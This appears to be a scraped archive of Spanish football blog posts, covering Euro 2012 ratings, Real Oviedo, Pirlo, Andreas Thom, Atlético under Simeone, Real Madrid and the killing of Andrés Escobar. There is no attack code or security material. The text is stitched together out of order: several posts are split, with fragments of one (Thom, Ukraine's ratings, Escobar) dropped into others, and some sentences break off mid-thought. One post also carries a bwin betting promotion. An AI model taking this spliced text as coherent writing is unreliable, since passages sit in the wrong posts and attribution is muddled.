al nuevo club. Imagino que el presidente del Auxerre dio por bien invertidos los meses de espera. ¿Cómo se adaptó al fútbol modesto una supuesta estrella? Una palabra, trabajo. Se puso el mono para los parroquianos del Abbé-Deschamps de la 80 a la 85. Durante esas cinco memorables temporadas tuvo ocasión de enfundarse la camiseta titular en 154 ocasiones y de marcar 94 tantos convirtiéndose en el máximo artillero de la historia del equipo. La marca todavía no ha sido superada. Siempre en la élite de la liga pese a desempeñarse en un conjunto modesto fue escogido en dos ocasiones mejor jugador extranjero del campeonato. Y ya en el ocaso de su vida deportiva, con 37 años de claroscuros y sin levantar ni un sólo título en Francia abandonó su segunda casa para retirarse en Clermont haciendo las veces de entrenador-jugador, previo paso por el Guingamp. En el recuerdo de los hinchas del Auxerre queda el recuerdo del mejor delantero que han tenido. La imagen de un profesional escrupuloso. En el de los apasionados de épocas pasadas, de las historias pequeñas, la coartada para esperar tiempos mejores. Y para amargar al compañero de localidad…La operación retorno fue tan larga y penosa que al bajar del coche, tras 12 años de atascos y vacaciones forzadas, olvidamos si habíamos cerrado bien el piso. Demasiado tiempo desde que bajamos las persianas y comenzamos a recorrer la España profunda, lógico que la memoria fallara y girar la cerradura fuera un puro ejercicio de incertidumbre. ¿Cómo nos encontraremos la Segunda? , pensamos. ¿Seguirá todo igual? Y abrimos la puerta del Tartiere despacito, con un signo de interrogación enorme sobre la cabeza. Con la esperanza de que en caso de desastre los cacos hubieran respetado al menos los objetos sentimentales. Ya en mitad del salón, soltamos un suspiro de alivio porque el juego y la personalidad de la temporada pasada estaban. Cama y lavabo. Los calzoncillos. ¡Pero es que hasta las figuritas de santos seguían intactas! . La de Susaeta mirando al cielo, la de San Esteban y hasta la de Borja Valle en moto. Halo de luz, coro angelical, sonrisina de alivio y vuelta a la rutina con alegría.Después llegó el Señor Lobo, los dos guantazos del Lugo. Dos hostias bien dadas que debemos agradecer hasta el final de temporada. Gracias papá, me las merecía.Un partido ganado y dos derrotas, dos tantos a favor y cuatro en contra. Goleador: Shevchenko (2). Lo mejor. La capacidad de reacción tras el gol de Ibra en el primer partido, la voluntad de no cerrarse y la verticalidad y clase de sus interiores Yarmolenko y Konoplyanka.Lo peor. Poca competitividad en los últimos dos partidos –especialmente ante Francia-, problemas al tirar la línea atrás y alguna declaración extemporánea de Blokhin.La estrella. Andrei Shevchenko se tomó el torneo como la última oportunidad para cerrar como se merecía una carrera gloriosa, y al menos dejó un partido inolvidable delante de su gente. A los 35 años, no estaba ya para másEl momento. Ese balón de Devic que tocó madera y acabó entrando sin que lo vieran ni Kassai, ni su asistente ni el inútil juez de portería. Una jugada que selló a la vez el destino de Ucrania y de los goles fantasma del futuro.Suecia. Primera fase. Un partido ganado y dos perdidos, con cinco goles anotados y otros cinco recibidos. Goleadores: Ibrahimovic (2),  Mellberg, Larsson y Glen Johnson en propia puerta.Lo mejor. Menos encorsetada que en otros campeonatos, la selección escandinava ofreció un fútbol bastante alegre  y partidos movidos, de los que gustan al espectador. En particular, su actitud ante Francia, con todo el pescado vendido, resultó encomiable.Lo peor. Quizá les faltó un punto de madurez para aguantar el resultado favorable ante Ucrania e Inglaterra. Aparte, el hándicap de que no haya casi nada alrededor de Ibra –Elmander no anduvo bien- es casi insuperable.La estrella. Tratándose de Suecia, es casi rutinario escribir aquí el nombre de Zlatan. No fue su mejor torneo, pero el 90% del juego de ataque de su equipo salió de sus botas o pasó por ellas. Y el gol a Francia, de museo.El momento. Lo tuvieron muy cerca cuando Mellberg cabeceó el 2-1 momentáneo frente a Hart, y así lo atestiguaba el semblante enloquecido del defensa, una especie de Thor con pasado racinguista. Minutos de esperanza hasta que apareció el Walcott de sus días buenos, y cerró la puerta. Quizá sea el momento kafkiano por excelencia de la historia de los Mundiales –aunque el pulpo Paul se haya propuesto desafiarlo-. Francia ganaba por 3-1 a Kuwait en la ronda previa del Mundial 82, cuando Giresse logra el cuarto tanto justo después de que un silbato suene en la grada y el árbitro Stupar ordene seguir. Ante el asombro del respetable y la pasividad de la fuerza pública, el jeque  Fahid al-Sabah, presidente de la federación kuwaití, salta al campo, ordena a su equipo que se retire y sostiene con el colegiado un largo diálogo en el que según algunas fuentes llega incluso a blandir un puñal. Increíblemente, el árbitro se retracta y anula el gol, en una situación sin parangón en partido alguno. La jugada no tuvo mayores consecuencias deportivas –acabaría venciendo Francia de todos modos-, pero sí para Stupar, que no volvería a arbitrar en su vida. Para el resto ha quedado como una anécdota simpática y exótica, que da gusto oír contar a Giresse en el video. Parece Louis de Funès. Hay futbolistas a los que resulta antinatural imaginar con una camiseta diferente a la que han llevado toda su vida. No es exactamente el caso de Andrea Pirlo, porque algunos le recordamos con la nerazzurra antes de que la Bienamada lo despreciase, e incluso flashes perdidos hay por la cabeza en los que sale con el azul de Brescia o el encarnado de la Reggina. Sin embargo, pocos futbolistas en los últimos quince años se han identificado tanto con un club como el cerebro por excelencia con el Milán de la tercera época dorada. Es imposible imaginarse esos cambios de juego, esos disparos medio caricia medio arcabuz, o los mejores pases largos que han surcado cielos en los últimos años, dados por un tipo que no fuera vestido de rojo y negro. Por eso nos resultará tan extraño ver el cuerpo desgarbado de Andrea ceñido por la zamarra de la Juventus, el único grande italiano que no había disfrutado de su fútbol inolvidable.Tres años le esperan en Turín, a donde llega como un salvador para un club sumido en la indefinición, que apenas ha levantado cabeza desde que lo tiñó la vergüenza, y que representa muy bien la espiral negativa que ha sufrido el fútbol italiano en los últimos años. Un erial en el que, a pesar de todo, todavía brillan gemas como Pirlo. Aunque no nos lo imaginemos vestidos de blanquinegro. Quedando pocas horas para ese Tottenham-Madrid que parece tan definido, no está mal echar la vista atrás para recordar el único paso del equipo blanco en partido oficial por el vetusto Lane. Una alineación donde mezclaban las trillizas con gente como Stielike o Valdano deja por sí sola aroma a mito, pero la realidad es que los merengues se encontraban contra las cuerdas en una Liga que dominó a placer el Barcelona, y sólo la UEFA aparecía como única tabla de salvación. Resultó una eliminatoria átona, encajada entre los fuegos artificiales de las remontadas a Anderlecht e Inter, y decidida por un gol en propia meta del lateral Perryman, expulsado en la vuelta. Crecía la leyenda de un Buitre que fue el mejor en Londres, y los blancos acabarían salvando la temporada levantando el trofeo más abollado del planeta fútbol; los Spurs, por su parte, pagaron la inoperancia de Hoddle y, en menor medida, de Mickey Hazard, y dijeron adiós sólo un par de meses antes de que el fútbol británico entrara en el túnel por la triste puerta de Heysel. Aunque caigan hoy, es agradable verlos de vuelta en la máxima competición. Sobresaliente: Sheva. No hay mucho más que decir ya, e incluso aquí ya hemos recordado perlas que nos obligó a escribir, pero esto va de calificaciones y si alguien ha merecido un sobresaliente en lo que va de competición, es el bueno de Andrei. Las redes sociales se colapsaban anoche sobre las diez, cuando se cosificaba en pantalla uno de los motivos por los que nos sentamos delante de la tele los apasionados de la pelotita. Desde Ulises a House la historia del héroe cansado ha puesto los pelos de punta durante tres mil años, así que cómo no iba a ocurrir anoche, con todo un país soñando en amarillo, un pasado diamantino y el presente que ya se lo tragaba con la indiferencia que dedica a los mejores. Marcó Shevchenko, brilló al fin el torneo, rugió el mundo. Y luego, volvió a marcar.Notable: Yarmolenko. Sale del mismo partido, nada extraño si tenemos en cuenta que Ucrania ha sido de los poquitos que ha salido a ofrecer antes que a defender o especular. Le ha oscurecido el mito, pero el partidazo que se marcó anoche Yarmolenko en la banda derecha de Ucrania no debe pasar desapercibido.Ninguna noticia más feliz para el Oviedo que enfrentarse a un equipo real después de 12 años, ninguna más saludable que un meneo cuando todos estábamos pendientes de efemérides y simbolismos. Los de Milla son miembros notables del club de la rula (allí apuntan y no preguntan) y con media les sobró para hacernos daño. Son precisos y rápidos, son la Segunda división. Un despiste defensivo todo candor y una anticipación en el área chica se tradujeron en dos buenos calentones. Uno en cada moflete que sirvieron para poner al equipo en vereda y como manual de instrucciones condensado de la Liga Adelante. Así, el hormigueo en las mejillas desplazó rápido el calor hasta el corazón y empatamos (2-2) por pura apelación a la garra. Con la inercia y amarrado al pase, el Oviedo debió incluso ganar, así que buenas son tortas.Aunque la mejor noticia no es regresar al profesionalismo, ni siquiera que hayamos podido hacerlo con el icono Cervero en el once. Tampoco el punto y el buen juego, sino haber recuperado la ilusión. El Oviedo se desprendió de una mochila cargada de piedras en Cádiz y ahora, aliviado, suda para fabricarse un futuro mejor en lugar de para enterrar los cadáveres del presente de mala manera. Ese empuje fresco se nota en la grada y se transmite al equipo. Ahí está esa costumbre preciosa y ya clásica de forzar la garganta en el Tartiere con cada gol en contra. Que sepamos cuidar esa vitalidad dentro y fuera del campo para que la temporada que viene nos toque abrir con dudas la puerta de otra casa más importante. Está a la vuelta de la esquina.Foto: Real Oviedo I follow the MoskvaDown to Gorky ParkListening to the wind of change¿Cuando me entregará el Trabant que acabo de encargarle? Dentro de seis años ¿Me paso por la tarde o por la mañana? Para eso aun faltan seis putos años, ¿En serio necesita saberlo ahora? Pues me vendría de perlas, jefe, porque justo ese día me viene el fontanero.Las baladas jevis son las mejores incluso las que nos llegan del otro lado. Los Scorpions petan tanto el radiocassette que podrían abrirlo por la mitad y yo llevo un peinado como para currar de pipa en sus conciertos. Me llamo Andreas Thom y soy el primer futbolista de la RDA que va a jugar en la Bundesliga. Es el 1 de enero de 1990, Europa ha muerto y yo quiero dinero.Hoy se cumplen 22 años del hito. Thom, delantero estrella del Dinamo de Berlin comenzaba a trabajar para el Bayer Leverkusen casi dos meses después de la caída del muro.Y para eso, entendemos, hace falta algo más que un muy buen futbolista.Kane, pleno de confianza y tocado por un rayo divino desde que arrancara el presente año, respondió con creces a las expectativas generadas en la previa. Al tercer balón que tocó, alojó con la cabeza el balón cruzado servido desde el costado izquierdo por Raheem Sterling en las redes lituanas. Un gol intrascendente en el marcador (era el cuarto de los ingleses ante una Lituania desfondada) pero con un importante significado en la incipiente trayectoria de la nueva sensación del fútbol inglés, abonada para la esperanza después de pasar con notable su primer test internacional serio. Y ya sabemos de lo poquito que necesitan por allí para celebrar el nacimiento de una nueva estrella. Decían que ya caería. Que poco a poco, y con el transcurso del campeonato, empezaría a aflojar, se iría quedando con las costuras al aire y, al final, acabaría rasgándose como un guiñapo para volver a ser el de (casi) siempre. Lucir como alternativa siempre es peligroso. Por un lado, levantas unas expectativas a las que muy frecuentemente sueles traicionar. Por otro, caminas como un sospechoso, observado con lupa, como si tu lugar fuese otro y estuvieses ocupando una plaza que no te corresponde y para la que no has acumulado méritos suficientes. Allá por el mes de agosto, todo el mundo veía como alternativa al Atlético del Cholo Simeone. Sin embargo, la previsión generalizada era de que la alternativa se terminaría desvaneciendo con el paso de los meses, diluyéndose en la intrascendencia y en la nostalgia del quiso pero no pudo, del qué cerca estuvo.Seis meses después del comienzo del campeonato liguero, la alternativa se ha convertido en el rival a batir. No solo no se ha desinflado, sino que con el transcurso de las jornadas ha ido afianzando su posición en la tabla, asentándose en un escenario que parecía no ser el suyo, hasta situarse en ese punto en el que ya nadie considera que ‘ya caerá’. El Atleti es una roca. Un farallón que resiste estoico el salvaje envite del oleaje, mientras observa de cerca cómo sus semejantes van resquebrajándose y cayendo poco a poco entre la espuma del mar embravecido. Tal resistencia, va minando la moral de sus rivales hasta hacerlos inofensivos, ahogados en su propio desgaste ante la imposibilidad de meter mano al, desde ayer, nuevo líder de la clasificación. El conglomerado pergeñado por el Cholo se está mostrando con una dureza y una fiabilidad imprevisibles. Y lo mejor es que ha llegado a ese punto de cohesión y afinamiento en el ensamblaje, que da la sensación de que cualquier cambio que el técnico colchonero introduzca en su equipo será bien asimilado. Todas las piezas encajan en el Tente del cholismo; aunque sean de Lego. Con apenas dos partidos con la camiseta rojiblanca, José Sosa parece haber convencido ya al Calderón de que su incorporación era más que un simple capricho del jefe. Juega como si hubiese nacido en Aluche y llevase mamando atletismo en el Cerro desde los diez años. Por su parte, a Diego Ribas no se le iba a exigir pasantía alguna. Por su pasado, no ofrecía dudas. Y sus minutos de ayer frente a la Real, apenas dos días después de aterrizar en Madrid, confirman que su incorporación era una apuesta ganadora.Parece complicado que este Atleti ofrezca síntomas de debilidad en un futuro próximo. Pese a todo, el presente inmediato me plantea una doble duda: ¿cómo afrontará el equipo la inminente exigencia de la Champions League y su coexistencia con la Liga? Arda, Koke, Villa, Costa, Sosa, Diego, Adrián… ¿seguirá esa plantilla siendo una balsa de aceite o terminará haciéndose notar la lógica lucha de egos a la mínima que lleguen dos malos resultados? Por extraño que pueda parecer, el hombre que ven en el centro de la foto acaba de anotar un gol crucial para su equipo. Ha conseguido anular la ventaja inicial del rival en los minutos finales del partido y permite a los suyos postularse como serio candidato al título liguero, impidiendo de paso que su contendiente se distancie en la clasificación con un sonoro golpe de autoridad. Al menos, queda claro que querrán dar guerra hasta las últimas jornadas. Pero la situación no invita a una explosión de júbilo, como procedería en circunstancias normales.Los caprichos del fútbol moderno quisieron que Frank Lampard, leyenda del Chelsea tras trece prolíficas temporadas como ídolo absoluto del Bridge y quizá uno de los últimos representantes de un fútbol sentimental que cada vez tiene menor presencia en el panorama internacional, protagonizara un guión inverosímil. Porque es complicado imaginar un escenario más escabroso para quien lo fue todo como futbolista blue y una situación más contra natura para el actual jugador del New York City FC, ese equipo que, en el colmo de la modernidad, todavía no existe.Viendo las imágenes del gol de Frankie y de los instantes posteriores, intento analizar e interpretar la comunicación no verbal del hoy verdugo de Mourinho. La ovación cerrada de su exafición, su clásico gol (tantas y tantas veces visto en Fulham Road) entrando desde segunda línea e irrumpiendo en el área rival… y ni una tímida carrerita, ni una mueca de complicidad con sus compañeros, ni un solo gesto de alegría. Solo calma, cabeza gacha, y lo que entiendo que es dolor. Dolor y desasosiego. Profundo, sincero y real. Denis Suárez. El gallego aparece con cuentagotas. Se dosifica demasiado y tal vez por eso no consiguió despegar en Sevilla. Pecadillos de juventud. El caso es que cuando aparece, cuando tiene el día inspirado, se muestra como un futbolista imparable, capaz de hacer bailar al Villarreal al son que él marque. Interpreta como pocos el arte del contragolpe. Los tres puntos amarillos en Anoeta son de su entera responsabilidad.Iker Muniain. En el día de su vigésimotercer cumpleaños (llevamos toda una vida hablando de él y solo tiene veintitrés años…), el atacante navarro del Athletic recibió el mejor regalo que puede recibir un futbolista con ansia de césped. Iker volvió a pisar el verde de San Mamés tras ocho meses y medio de lesión y posterior recaída. Su rentrée tuvo más de anímico y emocional que de futbolístico. Fueron apenas unos simbólicos minutos sin mayor trascendencia en el juego del equipo, pero la sensación de que sigue siendo un futbolista útil es algo que necesitaba tanto el Athletic como el propio jugador.Gareth Bale.Entre medias, y esa fue la novedad tangible, tres millones y medio de marcos. A Thom le siguieron algunos de compañeros en el Dinamo, Rainer Ernst, Frank Rhode y Thomas Doll, luego los chavales de Dresde, Ulf Kirsten y el inolvidable Mathias Sammer y después muchísimos más. Cortes de pelo imposibles, acero alemán que por fin iba a fundirse con el de los hermanos occidentales.Cambiamos de año, con el futuro en el aire y me ha apetecido recordar un momento fugaz del infrafútbol europeo. Sube el volumen al diez, los Scorpions anuncian vientos de cambio. Hipnotizados por el carisma de Raúl o el pie de seda del Ronaldo gordo y mito muchos en el entorno madridista parecen empeñados en tirar de silbidito y hacerse el sueco cuando el cromo que lleva la camiseta nueve pasa por su lado. A Gonzalo Higuaín le costó horrores caer en gracia y tres cuartos de lo mismo le está sucediendo a Karim Benzema. Parece que sus goles no suman, que son invisibles al ojo estadístico. Y reconozco que yo era el primer escéptico sobre la temporada que pudiera cuajar el francés esté año. Más que nada porque entre suplencias y actuaciones proclives a la desidia, al dámela cortita y al pie, el nueve galo había despachado un arranque de temporada para olvidar. Pero no es menos cierto que en el sprint, cuando las patatas queman, el tipo está haciendo sus números. Ha abierto el marcador en nueve ocasiones y eso vale oro.Por más que su publicación deportiva de cabecera emplee buena parte de sus recursos en bombardear con loas al francés, nieve o truene,  lo de Benzema no despierta unanimidad como no lo hacía lo de Higuaín hace un tiempo. Quien sabe si porque en el imaginario colectivo el nueve todavía aparece estrellando cochazos en La Finca o casi autista ante el último remate errado pero parece que no se llevará al huerto a la muy exigente parroquia merengue hasta que decida transpirar un poquitín más la camiseta. Lo de la mujer del César suena a milonga pero va a ser indispensable que el francés se aplique ese cuanto si quiere que la grada vuelva a hacerle ojitos.Pero más allá de gestos a la tribuna y por encima del colchón numérico con el que Benzema va a acabar justificando el sueldo de este año yo me quedo con la clase que destila cada acción suya. Finura en el pase y en el remate impagables mediante, reconozcamos que Benzema, además de un par de goles decisivos este años, tiene un vídeo excelente. Falta la reválida, que bien podría darse contra el Olympique, pero solo por eso hay que seguir apostando por él. Tengo un amigo madridista que se pone negro cuando a los empleados del club les da por desempolvar el traje de espiritista. Que fuma en pipa cuando a los que dirigen el asunto merengue les da por moler el discurso de una de las instituciones deportivas más potentes del mundo hasta reducirlo a un polvito de viejos espíritus, miedos escénicos y otras naderías. ¡Es que manda cojones que todo un Real Madrid tenga que travestirse de medium para sacar los partidos adelante”, me dice con el nubarrón peinándole el flequillo y a mi no queda otra que darle la razón y consolarle conque la piecita  inspiradora es el pan nuestro de cada día en el fútbol actual.Les cuento esto, claro, al hilo del vídeo promocional que Real Madrid Televisión ha elaborado y puesto en circulación para motivar a la parroquia de cara al trascendental, tras la insospechada derrota casera aun más si cabe, envite de mañana en Copa de Europa frente el Tottenham. Si gustan pueden verlo en la web del Real Madrid pero ya les anticipo que solo les gustará si son aficionados a esa épica de cartón piedra que de tanto machacar las pantallas de cine ha terminado por colonizar y pervertir la imaginería del fútbol. Si creen, en definitiva, que el fútbol es una intro del Pro Evolution.De un tiempo a esta parte se ha convertido en norma que los interlocutores del Madrid le reclamen constantemente a su afición la pasión que, a tenor de la súplica continuada, parece haber perdido, que le recuerden que no empuja lo suficiente. Se ha convertido en norma mendigar lo obvio. ¿Es necesario barnizar con la brocha de “300” cada envite serio que tenga que afrontar el equipo? ¿ Hay que rescatar la ouija hacia la felicidad cada año? ¿Qué pensaría ese Juan Gómez orgulloso si le hubieran recordado periódicamente que su compromiso era una filfa comparado con el de los viejos buenos tiempos? Llámenme loco pero yo creo que hemos perdido el norte cuando todo un Real Madrid y aquí incluyo jugadores, afición y cuerpo técnico, necesita fustigarse cada tiempo con una sartenada de petardos tan ruidosos como efímeros para preparar una eliminatoria de Copa de Europa. Que sí. Que yo soy el primero en echar pestes por la boca, parezco un personaje de última viñeta en cualquier album de Ibáñez, durante esa fase de grupos soporífera y recaudatoria pero hay que reconocer que cuando la Copa de Europa se pone bonita pues se pone. El bombo manda al Real Madrid a pelear el pase contra el Tottenham, la vuelta en White Hart Lane, y al Barcelona contra el Shakhtar Donetsk, la vuelta en Ucrania. ¿Ha habido suerte para los españoles en liza? Mitad y mitad. En condiciones normales deben imponerse, especialmente el Barcelona, pero ambos rivales son más que peligrosos. Equipos con veneno arriba y un as en la manga con el segundo partido, enfrente habrá dos tapados en toda regla. Por cierto, Barcelona y Madrid podrían protagonizar una semifinal de escándalo si cumplen con lo esperado en cuartos pero mientras tanto, a que negarlo, habrá miradas cruzadas a ver si ucranianos e ingleses tienen su noche.La ronda de emparejamientos, 5/6 la ida y 12/13 de abril la vuelta, la completan todo un Chelsea- Manchester United, que los londinenses querrán usar para rescatar algo del orgullo que se han dejado por el camino en este temporada desigual y un magnífico a todas luces Inter-Schalke (con Raúl de nuevo en el vértice de la historia) que parece de aliño tal y como han quedado el resto de cruces. Esta sí es la Copa de Europa. Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Me paro a ojear como viene el Madrid-Lyon en varias pantallas. En la primera escucho lo que cantan las casas de apuestas (en bwin pagan más de siete euros a victoria gala frente a uno y medio por triunfo merengue) y veo a los once chavales de blanco calzándose la gorra de chulapo y pasando a cuartos silbando. En la segunda aparece la cabeza de un madridista acérrimo, de esos que ya tienen la anonadante bufanda del Marca en casa, y ahí adentro flotan frases en neón brillante y se enredan formando un mantra. “En Liga solo hay un equipo que nos pueda toser”. “Gracias a la mano amiga sevillista volvemos a olerle el rebufo al bólido”. “Benzemá ya es más letal que desesperante”. Por último, en esa televisión de hace un par de temporadas que nadie quiere, aparece un tipo enchaquetado en gris que hace cálculos y te escupe sencillamente que el Real Madrid nunca gana al Lyon. Ni en Gerland ni en el Bernabéu.Se nota que el partido viene peliagudo cuando les pasan el micrófono a los actores y hablan de todo menos de fútbol. Y en esas estamos, con la empresa en pleno tirándole  el gancho a la afición.Diego López es una garantía, internacional, sobrio, brillante como parapenaltis, entre los cinco mejores de nuestro país. Iraizoz ha demostrado esta temporada que está en forma, una suma de heroicidades que han dado a su equipo algunos puntos ganados bajo palos. En los otros dos equipos que saltarán dentro de unas horas al césped abundan las dudas. La lesión de De Gea ha reabierto la herida atlética. Asenjo se ha caído, de estrella en verano a lastre en la actualidad. En el Valencia Moyá, previsiblemente, dejará de disfrutar de su patente en la Europa League a favor del veterano César; su clamoroso fallo en la ida ante el Brujas lo condenan al banquillo. Tener un buen portero es indispensable para ganar partidos. Ya no es lo que detiene en el área pequeña, es también la seguridad que debe transmitir a sus compañeros. Ahí reside el principal obstáculo de Asenjo y Moyá, son dos porteros que han logrado insuflar desconfianza en sus defensas. La comunicación entre guardametas y zagueros debe ser fluida, calmada, jerárquica. La juventud y los errores persiguen a dos porteros que hace no mucho eran recibidos con aplausos y que hoy no transmiten nada bueno a los aficionados, y lo que es peor, al resto de su equipo.Moyá despuntó en el Mallorca. El buen reemplazo de Aouate no debe hacernos olvidar lo que supuso la irrupción del guardameta en el equipo bermellón. Pasó tres años en la isla siendo prácticamente indiscutible y ni la llegada de un prometedor Germán Lux consiguió hacerlo parpadear lo más mínimo. El Valencia iba necesitando un portero que cubriera el enorme hueco que dejó Cañizares, ni Butelle, ni Hildebrand, ni Renan, ni Guaita pudieron hacer olvidar al siempre cuestionado portero de Puertollano y ya llevaban tiempo fijándose en el portero del vecino. Mientras se cerraba la incorporación, como medida de urgencia, se trajeron a mitad de temporada pasada a César Sánchez, que prácticamente acababa de llegar a Londres para conocer el fútbol británico de mano de los Spurs. Lo que fue un fichaje circunstancial se ha convertido hoy en el máximo responsable del arco ché. Pese a la firme apuesta, Moyá no ha demostrado en ningún momento estar capacitado para la máxima categoría y un portero veterano que ya coqueteaba con la retirada le ha ganado la partida. Es sensible la situación del cancerbero en un equipo, sus errores parecen brillar más que los del resto de sus compañeros, y en parte es así. Pero lo cierto es que el de Binisalem ni siquiera ha logrado hacer titubear la voluntad de Emery. Las pocas oportunidades que ha tenido han servido para confirmar su incomodidad sobre el césped. El castigo de hoy, doloroso, de los que marcan en una plantilla, es la consecuencia de su falta de acierto. Puestos a confiar en alguien para pasar de ronda, el entrenador valencianista no se dedica a elucubraciones poéticas, jugará el que mejor esté y hoy por hoy es indiscutible que ese rolo recae en el rejuvenecido César.Lo de Asenjo me sorprende aún más. En el Valladolid demostró ser un portero esplendido. Un alarde de reflejos y seguridad en el uno contra uno. Poco académico pero osado en sus actuaciones. Pronto se convirtió en el líder de un equipo que, comandado por Mendilibar, solventó sus temporadas en la élite del fútbol español con indiscutida brillantez. Que iba a ir a un equipo grande estaba claro. El Atlético de Madrid se adelantó a todos y lo fichó para despedir a Leo Franco y Coupet. Era caballo ganador, nadie iba a imaginar –y más viendo un inicio de temporada meritorio- que hoy estaríamos discutiendo sobre su titularidad. La irrupción de De Gea –un buen portero en las inferiores que ya llevaba tiempo sonando como buen futbolista de futuro- coincidió con la lesión de Asenjo y la posterior de Roberto. Cuando el titular volvió ya nada fue como antes. Las dudas que se intuían se convirtieron en un murmullo continuo en la grada, lo que antes eran aplausos se convirtieron en tímidos silbidos y pasó lo que pasó, dos o tres errores seguidos y al banco. De Gea, además, se lució en esos partidos y el hundimiento del prometedor guardameta palentino se convirtió en realidad palpable.Asenjo tiene esta noche una oportunidad de oro para reivindicar su calidad. Yo creo que la tiene. Lo veo algo lento, más musculado, parece haber perdido la chispa o la elasticidad que siempre tuvo. Parece tosco frente a la estampa –tan de Van der Sar– de su compañero De Gea. Aún así, yo confío en que será un portero a tener cuenta en el futuro. Pensemos que estos momentos son los que curten en la carrera deportiva de cualquier jugador. Recuerdo momentos oscurísimos de Casillas –suplencia en Champions a favor del ínclito César-, de Valdés –abandono del primer equipo, pequeñas rebeldías e inconformismo que casi le cuestan su continuidad en el club- y de Reina –abucheos del Camp Nou que solo se aliviaron cuando llegó al Villarreal-; esto por hablar de tres de los mejores porteros de nuestro país.“La afición debe decidir si quiere jugar o ver el partido” exige Mourinho. “Confiamos mucho en nuestro equipo y en el poder de nuestro estadio” refuerza esta vez sí Valdano. “La gente tiene que ayudarnos y, entre todos, estar en cuartos de final” ruega el capitán Casillas. Los tres departamentos a una. Y no es para menos cuando uno repara en lo pegajosos que siempre han sido los franceses, en ese Lisandro que vuelve, en Puel que es un zorro viejo o en los caprichos futuros del balón parado. En el peligro. Pero que no se me malinterprete, creo que el Real Madrid debe llevarse la eliminatoria al huerto. Por presupuesto, calidad, historia y escenario. Otra cosa con el 1-1 en la mochila y esta plantilla sería catastrófico.A la pizarra vuelve la ficha maestra, Cristiano Ronaldo. Y seguramente que esto le muestre el camino de banco a un Adebayor que, aunque bregador como en pocos tramos de su carrera, debería dejar su sitio a un Benzema de dulce.El oficio de guardarredes siempre ha sido complicado en España, por hacer rápida memoria: Zubizarreta, Molina, Palop, el citado Cañete… grandes porteros cuestionados en diferentes momentos de su trayectoria.Moyá lo tiene más difícil. Sin minutos es imposible reivindicarse. Emery no cree en la redención. Juega al pragmatismo con todos sus hombres. Si no estás, no estás. Los experimentos con gaseosa. Complicado ambiente el que tiene que superar el portero valencianista para hacerse un hueco en el florecido mundo de los guardametas de nuestro país. En el fútbol todo vale, menos la muerte. En la música, por ejemplo, la muerte tiende a ser algo esperado, un suceso que se anuncia por los excesos, por el desapego que el artista siente hacia el mundo que lo vio nacer. Cuando Jim Morrison murió nadie pudo hacerse el sorprendido. Kurt Cobain, Janis Joplin, Jimi Hendrix, Amy Winehouse, Brian Jones… hay en su existencia una fecha de caducidad, temprana, anunciada. Perder el miedo a la muerte alivia el peso de la vida. En el fútbol la muerte no se espera, siempre aparece como un terremoto que nos pilla viendo la televisión. Desde la base del edificio a la azotea, todo tiembla, todo parece desmoronarse. Ayer, viendo el documental “Los dos Escobar” de Jeff y Michael Zimbalist, me sorprendió que Andrés Escobar tuviera precisamente 27 años la noche que encontró la muerte.Hablar de fútbol es hablar de recuerdos infantiles. Por más que arrastremos el fútbol a nuestros días, siempre tenemos un pie en aquellos mundiales que vimos sin saber muy bien de qué iba todo esto. Mi primer gran recuerdo futbolístico fue el Mundial de Italia´90. Recuerdo a Conejo de Costa Rica, el “me lo merezco” de Michel, los goles de Schillacci, las carreras de Roger Milla y las pintas de los jugadores de Colombia. Allí estaban Valderrama e Higuita, Rincón y Leonel Álvarez. Jugadores que parecían diferentes, únicos, y que a un niño de diez años como yo era, con esa curiosidad ingobernable, todo esto le parecía de otro mundo.Entre esos jugadores, que tras una fase de grupos meritoria cayeron contra Camerún en octavos, estaba Andrés Escobar. Con el dorsal número 2, el medellinense había ganado la Copa Libertadores con el Atlético Nacional un año antes entrenado por Maturana, que ahora les había guiado en esta Copa del Mundo.Más armado de clase que de velocidad y más interior que extremo, el futbolista de San Petersburgo impartió un curso de toma de decisiones, que incluyó las asignaturas desplazamiento corto, desplazamiento largo, centro, pase profundo y tiro. Por momentos recordó a aquel Beckham del Manchester que dirigía a su equipo desde la banda, y no sólo por el tatuaje pinturero que adorna su brazo. Con 22 añitos va a dar que hablar.Aprobado: Ibra. Dicen que no rinde en su selección, y se ha llegado a escuchar la barbaridad de que quizá fuese un elemento perjudicial para ella. La verdad es que uno ve a Zlatan y a sus compañeros y piensa automáticamente en la presentación del superhéroe de turno entre pobres humanos sorprendidos. No sólo que marcase el gol, que eso ya lo hace casi siempre, de amarillo o de rossonero; fueron sus aperturas, cómo organizó los pocos contragolpes que lanzó Suecia, el pepinazo que le soltó a Pyatov, o el gol hecho que Elmander deshizo. Gustará o no por el norte, pero esta Suecia va a llegar donde llegue Ibra. Ni más ni menos. Suspenso: la cobardía. Se la puede llamar precaución, respeto al rival o simplemente jindama, y admite mil justificaciones. Ahora toca que es el primer partido y no se puede comenzar perdiendo. Hoy ya será que una derrota es definitiva. En cuartos, que un gol es un lujo y que hay que cuidarlo y cuidarse de él.Pasaron cuatro años y Colombia volvía a clasificarse para una fase final del Mundial, rubricando el pase con un mágico 0-5 a Argentina que hizo soñar a todo el país. Además de fútbol, en Colombia había tensión y una guerra abierta a cuenta del narcotráfico guiado por otro Escobar, de nombre Pablo. Tras su muerte en el 93, Medellín era un caos incontrolable. Antes los brazos de la mafia parecían controlarlo todo, ahora, sin el sanguinario capo; toda actividad delictiva era impredecible.Pelé dijo que Colombia era favorita para ganar la Copa del Mundo de Estados Unidos en el 94. No fue así. Cayó en primera ronda. Andrés Escobar, un defensa intachable hasta el momento y que estaba a punto de cerrar un contrato en Europa con el AC Milan, se marcó un gol en propia meta en el partido definitivo ante la anfitriona. El mundo cayó a sus pies. Días después de la eliminación, tras una riña en una discoteca provocada por las burlas de unos matones a cuenta de ese gol suicida, Escobar fue tiroteado en el asiento de su coche. Era el fin de un equipo, de un capitán y de una vida dedicada al fútbol.El documental de los Zimbalist, que recomiendo, hace equilibrios entre el bien y el mal. En algún momento casi parece que las vidas de Andrés y Pablo son paralelas, que “mueren en manos de los mismos hombres” como dice un entrevistado en el metraje. La sensación, leyendo sobre ambos, es diferente. Pablo Escobar y Andrés Escobar eran realidades antitéticas en un país partido en dos por el dinero y la droga. El primero perdió la vida por su avaricia y ambición, el segundo perdió la vida tras una vida dedicada a un deporte basado en el equipo, en la generosidad. Las muertes en el fútbol jamás se esperan. Ni a los 27 años. Los futbolistas tienen derecho a vivir para siempre. Puedes comprar camisetas de la selección nacional de 